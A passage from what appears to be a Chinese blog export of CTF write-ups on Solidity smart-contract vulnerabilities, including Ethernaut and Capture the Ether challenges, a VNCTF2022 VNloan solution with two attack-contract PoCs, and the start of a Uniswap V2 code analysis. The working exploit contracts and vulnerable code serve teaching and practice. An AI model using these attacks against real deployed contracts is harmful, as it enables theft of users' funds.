&#125;\n&#125;\n\n原理：transfer函数如果异常会转账失败，抛出异常。并且有gas限制，最大2300，避免了重入漏洞。\n漏洞分析：题目就是要求成为king，但是题目会进行king的重申，而transfer函数不同于call和send，call和send函数执行后会返回true或者false，transfer函数执行失败后会进行回滚(revert)所以我们将king变成自己后提交实例时要阻止关卡对于king的重申，简单来说就是让关卡触发receive函数时失败。直接使用revert让关卡在想攻击合约转账时失败以上两种方法可以使漏洞合约中的transfer函数执行失败从而进行回滚导致king的重申失败。\ncontract attack&#123;\n    address target =0xd4c14dEeE2d55e2F999FFaAdb8d11CC7c6f67909;\n    function attack() payable public &#123;\n        target.call&#123;value : 0.001 ether&#125;(\"\");\n    &#125;\n    fallback() external payable &#123;\n        revert();\n    &#125;\n&#125;\n\n相应例题：\nethernaut——King\nhttps://ethernaut.openzeppelin.com/level/0x43BA674B4fbb8B157b7441C2187bCdD2cdF84FD5\n2.整数溢出漏洞溢出漏洞原理：\n在solidity中有两种整数的表达方式，分别是int和uint，代表有符号和无符号整数，整数溢出漏洞存在于uint中，比如uint(0-1)就相当于2^256-1，系那个一个小数字变成一个极大的数，分为上溢出和下溢处。通常使msg.value上溢出让交易金额变小，使余额下溢处获得更多余额。\n例一，msg.value上溢出：\npragma solidity ^0.4.21;\n\ncontract TokenSaleChallenge &#123;\n    mapping(address => uint256) public balanceOf;\n    uint256 constant PRICE_PER_TOKEN = 1 ether;\n\n    function TokenSaleChallenge(address _player) public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance &lt; 1 ether;\n    &#125;\n\n    function buy(uint256 numTokens) public payable &#123;\n        require(msg.value == numTokens * PRICE_PER_TOKEN);\n\n        balanceOf[msg.sender] += numTokens;\n    &#125;\n\n    function sell(uint256 numTokens) public &#123;\n        require(balanceOf[msg.sender] >= numTokens);\n\n        balanceOf[msg.sender] -= numTokens;\n        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);\n    &#125;\n&#125;\n\n分析：\nbuy函数中require msg.value &#x3D;&#x3D; numTokens * PRICE_PER_TOKEN，其中PRICE_PER_TOKEN固定为1 ether，而numTokens。\nrequire直接进行乘法，没有检测计算值后得到的数值，在此处可以构造整数溢出漏洞从而使msg.value变成一个足够小的数值。\n例二，余额下溢处\npragma solidity ^0.6.0;\n\ncontract Token &#123;\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public &#123;\n    balances[msg.sender] = totalSupply = _initialSupply;\n  &#125;\n\n  function transfer(address _to, uint _value) public returns (bool) &#123;\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  &#125;\n\n  function balanceOf(address _owner) public view returns (uint balance) &#123;\n    return balances[_owner];\n  &#125;\n&#125;\n\n分析：一道非常简单的题目，看似逻辑比较严谨，但是注意 require(balances[msg.sender] - _value &gt;&#x3D; 0)一行，要知道，uint类型中0-1是大于且远远大于0的，此处存在溢出漏洞，并且value可控，直接计算value使余额下溢。\n相应例题：\ncapture the ether——Token sale\nhttps://capturetheether.com/challenges/math/token-sale/\nethernaut——Token\nhttps://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE\n3.随机数漏洞原理：\n合约使用外界未知的私有变量参与随机数生成。虽然变量是私有的，无法通过另一合约访问，但是变量储存进 storage 之后仍然是公开的。\n或者使用，hash，coinbase、timestamp、number、difficulty、gaslimit等类型值作为随机数的，也存在安全问题，因为这些变量都是已知或者可操控的，比如在同意笔交易中，blockhash，blocnumber等均是相同的。值得注意的是blockhash只能读取最近的256个区块，在之前的将直接返回0。\n例一，变量经过存储之后可查询\npragma solidity ^0.4.18;\n\ncontract Vault &#123;\n  bool public locked;\n  bytes32 private password;\n\n  function Vault(bytes32 _password) public &#123;\n    locked = true;\n    password = _password;\n  &#125;\n\n  function unlock(bytes32 _password) public &#123;\n    if (password == _password) &#123;\n      locked = false;\n    &#125;\n  &#125;\n&#125;\n\n分析：password直接存储在slot1，而在区块链中，数据可以直接查询，利用如下代码即可获得password\nprint(web3.eth.getStorageAt(contractaddress,1))\n\n相应例题：\nethernaut——Vault：https://ethernaut.openzeppelin.com/level/0xf94b476063B6379A3c8b6C836efB8B3e10eDe188\n例二，使用区块链变量\npragma solidity ^0.4.21;\n\ncontract GuessTheNewNumberChallenge &#123;\n    function GuessTheNewNumberChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function guess(uint8 n) public payable &#123;\n        require(msg.value == 1 ether);\n        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));\n\n        if (n == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\n分析：使用了区块链变量的伪随机数，同一笔交易中block.blockhash(block.number)和now均相同，直接再调用时让n&#x3D;&#x3D;uint8(keccak256(block.blockhash(block.number - 1), now))就可以了\n相应例题：\ncapture the ether——Guess the new number：https://capturetheether.com/challenges/lotteries/guess-the-new-number/\n例三，关于blockhash只能读取最近256区块\npragma solidity ^0.4.21;\n\ncontract PredictTheBlockHashChallenge &#123;\n    address guesser;\n    bytes32 guess;\n    uint256 settlementBlockNumber;\n\n    function PredictTheBlockHashChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function lockInGuess(bytes32 hash) public payable &#123;\n        require(guesser == 0);\n        require(msg.value == 1 ether);\n\n        guesser = msg.sender;\n        guess = hash;\n        settlementBlockNumber = block.number + 1;\n    &#125;\n\n    function settle() public &#123;\n        require(msg.sender == guesser);\n        require(block.number > settlementBlockNumber);\n\n        bytes32 answer = block.blockhash(settlementBlockNumber);\n\n        guesser = 0;\n        if (guess == answer) &#123;\n            msg.sender.transfer(2 ether);\n        &#125;\n    &#125;\n&#125;\n\n分析：block.blockhash这个函数，它可以获取给定的区块号的hash值，但只支持最近的256个区块，不包含当前区块，对于256个区块之前的函数将返回0，所以应该提前设置guess为0，再等待255+1个区块。\n相应例题：\ncapture the ether——Predict the block hash：https://capturetheether.com/challenges/lotteries/predict-the-block-hash/\n4.短地址漏洞正常用户从交易所取款或者转账时，先输入正确的地址，在输入小于或等于自己存储的以太币的数量，然后完成存取款。\n在调用函数时的input分为三个部分，接下来以erc20的transfer为例：\npart 1： 4字节，方法名的hash值，即transfer.selector。\npart 2：32字节，存储以太坊的地址，即20字节的address，未满足32字节，高位补0.\npart 3：32字节，需要传输的代币数量，未满足32字节则高位补0.\n上述三部分接合起来就是交易数据。\n在这个过程中，如果交易所或者钱包方没有校验用户输入的地址长度是否合法，就存在短地址漏洞。\n假设现在有合法地址0x1234567890123456789012345678901234567800。\n注意末尾的00，问题就处在地址末尾处的00，当我们将后面的00省略，然后将参数传递给智能合约时，参数将根据ABI规范进行编码。在00省略的情况下我们发送的就是19字节(38位地址)而不是20字节的标准地址，在这种情况下，EVM会自动从下一个参数的最高位拿到1个字节(2个十六进制位)来补充以达到预期长度，这就导致了段地址漏洞。\n比如在如下测试代码中\npragma solidity ^0.4.11\ncontract shortaddr &#123;\n    mapping(address=>uint)balanceOf;\n    constructor() public&#123;\n        balanceOf[msg.sender]=1000;\n    &#125;\n    function transfer(address to,uint amount) public&#123;\n        require(balanceOf[msg.sender]>=amount);\n        balanceOf[msg.sender]-=amount;\n        balanceOf[to]+=amount;\n    &#125;\n    function getbalance(address addr)view returns(uint)&#123;\n        return balanceOf[addr];\n    &#125;\n&#125;\n\n调用transfer函数并且使用上述短地址，转账5个token，amount参数最高位的00将会被吞掉，原本的转账5token将会变成转账0x500个token即900个，所以有较大风险。\n不过该漏洞几乎已经被修复，还没有遇到过相应的例题。\n不能通过 Remix 复现，因为客户端会检查地址长度；也不能通过 sendTransaction()，因为 web3 中也加了保护。\n但是，可以使用 geth 搭建私链，使用 sendRawTransaction() 发送交易复现，可进行复现。\n5.call调用漏洞call调用分为call，callcode以及delegatecal 原理：\n先分别理解一下三种call调用的异同\n\ncall: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者，执行环境为被调用者的运行环境(合约的 storage)。\ndelegatecall: 调用后内置变量 msg 的值不会修改为调用者，但执行环境为调用者的运行环境。\ncallcode: 调用后内置变量 msg 的值会修改为调用者，但执行环境为调用者的运行环境。\n\n\n情况一：call\n\nA合约：\ntemp1 &#x3D; 0\ntemp2 &#x3D; 0\nB合约：\ntemp1 &#x3D; A合约地址\ntemp2 &#x3D; 100\n说明：call调用后内置变量 msg 的值会修改为调用者（A合约地址），执行环境为被调用者（B合约）的运行环境(运行环境指合约的 storage)\n情况二：delegatecall\n\nA合约：\ntemp1 &#x3D; 调用A合约的以太坊账号地址\ntemp2 &#x3D; 100\nB合约：\ntemp1 &#x3D; 0\ntemp2 &#x3D; 0\n说明：delegatecall调用后内置变量 msg 的值不会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境\n情况三：callcode\n\ncallcode在solidity 0.5.0之后就被改变成了delegatecal\nA合约：\ntemp1 &#x3D; A合约地址\ntemp2 &#x3D; 100\nB合约：\ntemp1 &#x3D; 0\ntemp2 &#x3D; 0\n说明：callcode调用后内置变量 msg 的值会修改为调用者（A合约地址），但执行环境为调用者（A合约）的运行环境。\n例：\npragma solidity ^0.6.0;\n\ncontract Delegate &#123;\n\n  address public owner;\n\n  constructor(address _owner) public &#123;\n    owner = _owner;\n  &#125;\n\n  function pwn() public &#123;\n    owner = msg.sender;\n  &#125;\n&#125;\n\ncontract Delegation &#123;\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) public &#123;\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  &#125;\n\n  fallback() external &#123;\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) &#123;\n      this;\n    &#125;\n  &#125;\n&#125;\n\n分析：使用delegatecall，将会在调用者环境下执行，delegatecal即可修改合约中的owner\nattack：\ncontract attack&#123;\n    address target =0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005;\n    bytes4 public result;\n    function trandform()public&#123;\n    result=bytes4(keccak256(\"pwn()\"));\n&#125;\n    function pwn() public payable&#123;\n    target.call(abi.encodePacked(result,\"\"));\n&#125;\n&#125;\n\n源码层面：\nfunc Call(env vm.Environment, caller vm.ContractRef, addr common.Address, input []byte, gas, gasPrice, value *big.Int) (ret []byte, err error) &#123;\n\tret, _, err = exec(true, env, caller, &amp;addr, &amp;addr, env.Db().GetCodeHash(addr), input, env.Db().GetCode(addr), gas, gasPrice, value)\n\treturn ret, err\n&#125;\n\n// CallCode executes the given address' code as the given contract address\nfunc CallCode(env vm.Environment, caller vm.ContractRef, addr common.Address, input []byte, gas, gasPrice, value *big.Int) (ret []byte, err error) &#123;\n\tcallerAddr := caller.Address()\n\tret, _, err = exec(false, env, caller, &amp;callerAddr, &amp;addr, env.Db().GetCodeHash(addr), input, env.Db().GetCode(addr), gas, gasPrice, value)\n\treturn ret, err\n&#125;\n\n// DelegateCall is equivalent to CallCode except that sender and value propagates from parent scope to child scope\nfunc DelegateCall(env vm.Environment, caller vm.ContractRef, addr common.Address, input []byte, gas, gasPrice *big.Int) (ret []byte, err error) &#123;\n\tcallerAddr := caller.Address()\n\toriginAddr := env.Origin()\n\tcallerValue := caller.Value()\n\tret, _, err = execDelegateCall(env, caller, &amp;originAddr, &amp;callerAddr, &amp;addr, env.Db().GetCodeHash(addr), input, env.Db().GetCode(addr), gas, gasPrice, callerValue)\n\treturn ret, err\n&#125;\n\n三个地址分别对应为caller，execute env和codeaddr\n相应例题\nethernaut第六题——delegation\nhttps://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493\ncall调用：\n我现在能想到的关于call调用的漏洞就只有两个，一个是重入\n重入在基础漏洞的第一篇就已经说过了\n关于转账的漏洞 \n还有一个就是权限绕过，参考vnctf里边的vnloan那道题吧，之前发过博客，这里就不在说了\nVNCTF2022公开赛 Blockchain-VNloan - 跳跳糖\n还有就是关于callcode的例题，目前还没遇到过，等遇到了，我再补到这里\n6.未初始化的存储指针原理：未初始化的存储指针是指在 EVM 中未进行初始化的 storage 变量，这个变量会指向其他变量的区域，从而更改其他变量的值。\n在solidity智能合约语言中，有storage和memory两种存储方式。storage变量是指永远存储在区块链中的变量；memory变量的存储是临时的，这些变量在外部调用结束后会被移除。但是solidity目前对复杂的数据类型，比如array(数组)和struct(结构体)，在函数中作为局部变量时，会默认存储在storaeg中。solidity对于变量存储，都是按照状态在合约中的先后顺序进行依次存储的\n例：\n结构体\npragma solidity 0.4.24;\ncontract cover&#123;\n    address public owner=msg.sender;\n    struct Name&#123;\n        address user;\n        mapping(address=>uint)balanceof;\n    &#125;\n    function regeist(address youraddress) public payable&#123;\n        Name name;\n        require(msg.value>0);\n        name.user=youraddress;\n        name.balanceof[youraddress]+=msg.value;\n    &#125;\n    function getbalance(address tar)public view returns(uint balance)&#123;\n        Name name;\n        return name.balanceof[tar];\n    &#125;\n&#125;\n\n在进行注册并存款时，由于该storage变量未初始化，所以可能会覆盖其他变量，owner将会被覆盖为youraddress\n比如合约部署后，owner为合约部署者，但是在用户拿着自己的地址进行注册时，owner就变成了user\n部署后\n\nregeist后\n\n可见owner被覆盖\n这个例子的修复方案是使用 mapping 进行结构体的初始化，并使用 storage 进行拷贝：\npragma solidity 0.4.24;\ncontract cover&#123;\n    address public owner=msg.sender;\n    struct Name&#123;\n        address user;\n        mapping(address=>uint)balanceof;\n    &#125;\n    mapping(uint=>Name)wallet;\n    function regeist(uint id,address youraddress) public payable&#123;\n        Name storage wallets=wallet[id];\n        require(msg.value>0);\n        wallets.user=youraddress;\n        wallets.balanceof[youraddress]+=msg.value;\n    &#125;\n    function getbalance(uint id,address tar)public view returns(uint balance)&#123;\n        Name storage wallets=wallet[id];\n        return wallets.balanceof[tar];\n    &#125;\n&#125;\n\n\n部署合约后owner不会改变\n数组\n代码来源于ctf wiki\npragma solidity ^0.4.24;\n\ncontract example2&#123;\n    uint public a;\n    uint[] b;\n\n    function setValue(uint _a) public &#123;\n        a = _a;\n    &#125;\n\n    function attack(uint _value) public &#123;\n        uint[] tmp;\n        tmp.push(_value);\n        b = tmp;\n    &#125;\n&#125;\n\n\n部署合约后设置a为100，在用任意数字调用attack，在看a，可以发现a变成了101\n\n可见初始化时uint[] tmp导致数组长度变成了a的值，在进行push后，将temp赋值给b，此时覆盖了a为b的长度即100+1&#x3D;101\n例题：\npragma solidity ^0.4.21;\n\ncontract DonationChallenge &#123;\n    struct Donation &#123;\n        uint256 timestamp;\n        uint256 etherAmount;\n    &#125;\n    Donation[] public donations;\n\n    address public owner;\n\n    function DonationChallenge() public payable &#123;\n        require(msg.value == 1 ether);\n        \n        owner = msg.sender;\n    &#125;\n    \n    function isComplete() public view returns (bool) &#123;\n        return address(this).balance == 0;\n    &#125;\n\n    function donate(uint256 etherAmount) public payable &#123;\n        // amount is in ether, but msg.value is in wei\n        uint256 scale = 10**18 * 1 ether;\n        require(msg.value == etherAmount / scale);\n\n        Donation donation;\n        donation.timestamp = now;\n        donation.etherAmount = etherAmount;\n\n        donations.push(donation);\n    &#125;\n\n    function withdraw() public &#123;\n        require(msg.sender == owner);\n        \n        msg.sender.transfer(address(this).balance);\n    &#125;\n&#125;\n\n分析：执行donate时Donation初始化并传入对应参数，没有强调memory，所以占用storage，实际修改值为slot0以及slot1，所以将etherAmount为int(address(player),16)即可修改owner为player。\ncapture the ether——Donation\nhttps://capturetheether.com/challenges/math/donation/\n7.数组长度溢处原理：数组最大的长度为2^256，如果不做保护，数组长度下溢，通过扩大数组到整个 2^256 的存储区域. 然后用户就可以更改所有合约的storage了\n例：\n// SPDX-License-Identifier: MIT\npragma solidity ^0.5.0;\n\nimport '../helpers/Ownable-05.sol';\n\ncontract AlienCodex is Ownable &#123;\n\n  bool public contact;\n  bytes32[] public codex;\n\n  modifier contacted() &#123;\n    assert(contact);\n    _;\n  &#125;\n  \n  function make_contact() public &#123;\n    contact = true;\n  &#125;\n\n  function record(bytes32 _content) contacted public &#123;\n  \tcodex.push(_content);\n  &#125;\n\n  function retract() contacted public &#123;\n    codex.length--;\n  &#125;\n\n  function revise(uint i, bytes32 _content) contacted public &#123;\n    codex[i] = _content;\n  &#125;\n&#125;\n\n分析：数组长度可以通过retract函数下溢处达到2^256，此时codex.length为2**256-1，map[x]的存储地址为keccak256(slot(codex)),此处slot(map)为1，map[x]存储地址为keccak256(slot(codex))+x,所以构造x为 2^256-keccak256(1)，payload为任意地址即可覆盖Ownable-05.sol中的owner变量（owner和contact都存储在slot0）\n相应例题：\nEthernaut——Alien Codex \nhttps://ethernaut.openzeppelin.com/level/0xda5b3Fb76C78b6EdEE6BE8F11a1c31EcfB02b272\n","slug":"Smart Contract Basic Vulnerability Summary","date":"2022-08-01T10:46:51.248Z","categories_index":"","tags_index":"区块链","author_index":"bcYng"},{"id":"f5b9fca07821fa4050ef59953395a72d","title":"VNCTF2022 open tournament-> Blockchain-VNloan","content":"0x00 背景基于 Uniswap V3 的 DeFi 流动性协议Visor Finance遭受黑客攻击，黑客利用重入漏洞耗尽了880万枚VISR代币，当时，VISR的交易价格约为0.93美元，总损失约为820万美元。\n因为call调用产生的漏洞还是比较多的，比如重入漏洞，atn代币增发事件等。\n \n\n0x01 VNloan题目链接：https://buuoj.cn/match/matches/81/challenges\n解出密码获得题目合约\n\nSetup.sol\npragma solidity 0.4.26;\nimport \"./VNETH.sol\";\ncontract Setup&#123;\n    VNETH public vneth;\n    bool public Solved=false;\n    constructor()public payable&#123;\n        vneth=new VNETH();\n    &#125;\n    function checksuccess()public&#123;\n        if(vneth.balanceOf(msg.sender)>=5000)\n        Solved=true;\n    &#125;\n    function isSolved()public view returns(bool)&#123;\n        if(Solved==true)&#123;\n            return true;\n        &#125;\n        return false;\n    &#125;\n&#125;\n\nVNETH.sol\npragma solidity 0.4.26;\n\ncontract VNETH &#123;\n    address public owner;\n    string public name     = \"VN ETHER\";\n    string public symbol   = \"VNeth\";\n    uint8  public decimals = 18;\n    bool  public isLoan=false;\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n    constructor()public&#123;\n        owner=msg.sender;\n        balanceOf[owner]=1e18 ether;\n        balanceOf[address(this)]=1e18 ether;\n    &#125;\n    function() external payable &#123;\n        deposit();\n    &#125;\n    function deposit() public payable &#123;\n        balanceOf[msg.sender] += msg.value;\n        emit Deposit(msg.sender, msg.value);\n    &#125;\n    function withdraw(uint wad) public &#123;\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        (msg.sender).transfer(wad);\n        emit Withdrawal(msg.sender, wad);\n    &#125;\n\n    function totalSupply() public view returns (uint) &#123;\n        return address(this).balance;\n    &#125;\n\n    function approve(address guy, uint wad) public returns (bool) &#123;\n        allowance[msg.sender][guy] = wad;\n        emit Approval(msg.sender, guy, wad);\n        return true;\n    &#125;\n\n    function transfer(address dst, uint wad) public returns (bool) &#123;\n        return transferFrom(msg.sender, dst, wad);\n    &#125;\n\n    function fakeflashloan(uint256 value,address target,bytes memory data) public&#123;\n        require(isLoan==false&amp;&amp;value>=0&amp;&amp;value&lt;=1000);\n        balanceOf[address(this)]-=value;\n        balanceOf[target]+=value;\n\n        address(target).call(data);\n\n        isLoan=true;\n        require(balanceOf[target]>=value);\n        balanceOf[address(this)]+=value;\n        balanceOf[target]-=value;\n        isLoan=false;\n    &#125;\n\n    function transferFrom(address src, address dst, uint wad)\n        public\n        returns (bool)\n    &#123;\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender &amp;&amp; allowance[src][msg.sender] != 2**256-1) &#123;\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        &#125;\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        emit Transfer(src, dst, wad);\n\n        return true;\n    &#125;\n&#125;\n\n0x03 分析漏洞解法一  call调用首先分析setup代码，我们可以看到需要满足调用者的余额大于等于5000，确定下来方向然后主要看VNETH合约。\n我们可以看到在合约构造过程中，合约owner以及合约本身有1^18^*1^18^的余额，所以要是我们的攻击合约余额达到5000，可以从owner或合约中转账过来。\n而从合约中想指定账户转账需要提前授权相应数量的代币。\n\n所以在msg.sender是漏洞合约的前提下控制guy为攻击合约，即可为攻击合约获得权限\n\n注意到，在该函数中，可以在target的环境下调用data，而target以及data都是可控的，所以漏洞是出现在call调用处。\n所以我们可以构造data（包括function selctor以及对应参数），data可以通过调用approve函数获得。\n再对fakeflashloan函数进行调用，传入data即可调用漏洞合约下的approve函数，此时msg.sender将是漏洞合约本身，攻击合约将会获得来自漏洞合约的指定数量的代币授权。\n授权之后只需要调用transferfrom函数，将对应数量的代币转账到攻击合约中，即可满足解题条件。\npoc如下\ncontract attack&#123;\n    VNETH target = VNETH(0xe67f9c7880049BD323cc73D13Bed19c16dfC27F5);\n    Setup target1=Setup(0xb27A31f1b0AF2946B7F582768f03239b1eC07c2c);\n    function approve(address guy, uint wad)public&#123;\n        target.approve(guy,wad);\n    &#125;\n    function getallowance(uint256 value,address t,bytes memory data)public&#123;\n        target.fakeflashloan(value,t,data);\n    &#125;\n    function getmoney(address src, address dst, uint wad)public&#123;\n        target.transferFrom(src,dst,wad);\n    &#125;\n    function success() public&#123;\n        target1.checksuccess();\n    &#125;\n&#125;\n\n按照分析过程调用对应函数并传入相应的参数即可。\n\n解法二  重入\n\n分析合约代码可以发现该处存在重入漏洞，而在fakeflashloan函数中data可控，并且对于isLoan变量的修改放在call之后，可以造成重入。\n所以在攻击合约中调用一次fakeflashloan函数，随便输入一个data（bytes4类型，做selector）即可触发重入，攻击合约中的fallback函数内容为调用4次fakeflashloan函数（value是1000的情况下），此时总共调用了五次，余额达到要求。\n但是值得注意的是，调用setup合约中的checksuccess函数时，要由攻击合约中的fallback函数判断达到条件后进行调用，具体原因放在poc之后\npoc如下\ncontract attack&#123;\n    VNETH target = VNETH(0x4b0d7A551c9371AEfC004Ae1a9F184aCD39B89C6);\n    Setup target1=Setup(0x9d83e140330758a8fFD07F8Bd73e86ebcA8a5692);\n    bytes data = '0xabcdabcd';\n    uint i;\n    function reen()payable public&#123;\n        target.fakeflashloan(1000,address(this),data);\n    &#125;\n    function() external payable&#123;\n      while(i&lt;4)&#123;\n         i++;\n         target.fakeflashloan(1000,address(this),data);\n     &#125;\n    if(i==4)&#123;\n         target1.checksuccess();\n        &#125;\n    &#125;\n&#125;\n\n因为在进行call调用时，是一次call中嵌套着另一次call，总共五次。而在最后一次出发攻击合约中的fallback函数时已经不满足i&lt;4的条件。\ncall调用的特点是只返回true或false不会抛出异常，所以他会执行后续代码，也就是相机执行完五次嵌套中的后续代码，攻击合约中的余额将被归零，所以要按照poc中的方法进行攻击即可。\n\n0x04  总结call函数灵活性极高，合约在开发过程中，使用了危险的函数，并且使用不安全的交互模式，正是由于这种灵活性极高的函数的滥用造成了各种漏洞。\n在此给开发者提出以下建议：\n\n在合约开发过程中一定要谨慎的使用此类函数\n并且在使用的过程中，对调用的合约地址，可调用的函数进行严格限制\n智能合约在部署前必须经过严格的审计以及测试。\n\n","slug":"VNCTF2022 Blockchain-VNloan","date":"2022-08-01T10:45:15.790Z","categories_index":"","tags_index":"区块链 ctf","author_index":"bcYng"},{"id":"e27183e0e340d83abbd9dfc8e53b323b","title":"Analysis of uniswapV2","content":"相对系统且深入的了解了一下uniswapV2\nwhitepaper：\nhttps://uniswap.org/whitepaper.pdf\nEIP-2612：\nhttps://github.com/ethereum/EIPs/blob/master/EIPS/eip-2612.md?ref=learnblockchain.cn\nUniswapV2 Factory\nClick to see more\npragma solidity =0.5.16;\n\ninterface IUniswapV2Factory &#123;\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\n\n    function feeTo() external view returns (address);\n    function feeToSetter() external view returns (address);\n\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\n    function allPairs(uint) external view returns (address pair);\n    function allPairsLength() external view returns (uint);\n\n    function createPair(address tokenA, address tokenB) external returns (address pair);\n\n    function setFeeTo(address) external;\n    function setFeeToSetter(address) external;\n&#125;\n\ninterface IUniswapV2Pair &#123;\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n\n    event Mint(address indexed sender, uint amount0, uint amount1);\n    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);\n    event Swap(\n        address indexed sender,\n        uint amount0In,\n        uint amount1In,\n        uint amount0Out,\n        uint amount1Out,\n        address indexed to\n    );\n    event Sync(uint112 reserve0, uint112 reserve1);\n\n    function MINIMUM_LIQUIDITY() external pure returns (uint);\n    function factory() external view returns (address);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function price0CumulativeLast() external view returns (uint);\n    function price1CumulativeLast() external view returns (uint);\n    function kLast() external view returns (uint);\n\n    function mint(address to) external returns (uint liquidity);\n    function burn(address to) external returns (uint amount0, uint amount1);\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n    function skim(address to) external;\n    function sync() external;\n\n    function initialize(address, address) external;\n&#125;\n\ninterface IUniswapV2ERC20 &#123;\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external pure returns (string memory);\n    function symbol() external pure returns (string memory);\n    function decimals() external pure returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\n    function nonces(address owner) external view returns (uint);\n\n    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;\n&#125;\n\ninterface IERC20 &#123;\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    function name() external view returns (string memory);\n    function symbol() external view returns (string memory);\n    function decimals() external view returns (uint8);\n    function totalSupply() external view returns (uint);\n    function balanceOf(address owner) external view returns (uint);\n    function allowance(address owner, address spender) external view returns (uint);\n\n    function approve(address spender, uint value) external returns (bool);\n    function transfer(address to, uint value) external returns (bool);\n    function transferFrom(address from, address to, uint value) external returns (bool);\n&#125;\n\ninterface IUniswapV2Callee &#123;\n    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;\n&#125;\n\ncontract UniswapV2ERC20 is IUniswapV2ERC20 &#123;\n    using SafeMath for uint;\n\n    string public constant name = 'Uniswap V2';\n    string public constant symbol = 'UNI-V2';\n    uint8 public constant decimals = 18;\n    uint  public totalSupply;\n    mapping(address => uint) public balanceOf;\n    mapping(address => mapping(address => uint)) public allowance;\n\n    bytes32 public DOMAIN_SEPARATOR;\n    // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\");\n    bytes32 public constant PERMIT_TYPEHASH = 0x6e71edae12b1b97f4d1f60370fef10105fa2faae0126114a169c64845d6126c9;\n    mapping(address => uint) public nonces;\n\n    event Approval(address indexed owner, address indexed spender, uint value);\n    event Transfer(address indexed from, address indexed to, uint value);\n\n    constructor() public &#123;\n        uint chainId;\n        assembly &#123;\n            chainId := chainid\n        &#125;\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n                keccak256(bytes(name)),\n                keccak256(bytes('1')),\n                chainId,\n                address(this)\n            )\n        );\n    &#125;\n\n    function _mint(address to, uint value) internal &#123;\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    &#125;\n\n    function _burn(address from, uint value) internal &#123;\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    &#125;\n\n    function _approve(address owner, address spender, uint value) private &#123;\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    &#125;\n\n    function _transfer(address from, address to, uint value) private &#123;\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    &#125;\n\n    function approve(address spender, uint value) external returns (bool) &#123;\n        _approve(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    function transfer(address to, uint value) external returns (bool) &#123;\n        _transfer(msg.sender, to, value);\n        return true;\n    &#125;\n\n    function transferFrom(address from, address to, uint value) external returns (bool) &#123;\n    